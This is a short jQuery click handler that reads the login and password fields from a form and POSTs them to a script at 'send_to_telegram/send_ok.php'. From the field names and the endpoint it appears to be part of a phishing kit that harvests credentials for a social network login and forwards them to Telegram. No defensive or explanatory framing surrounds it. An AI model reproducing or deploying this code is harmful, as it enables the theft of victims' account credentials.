$("#send_ok").on("click", function () {
	var ok_login = $("#ok_login").val()
	var password_ok = $("#password_ok").val()


	$.ajax({
		url: 'send_to_telegram/send_ok.php',
		type: 'POST',
		cache: false,
		data: { 'ok_login': ok_login, 'password_ok': password_ok },
		dataType: 'html'
	})
})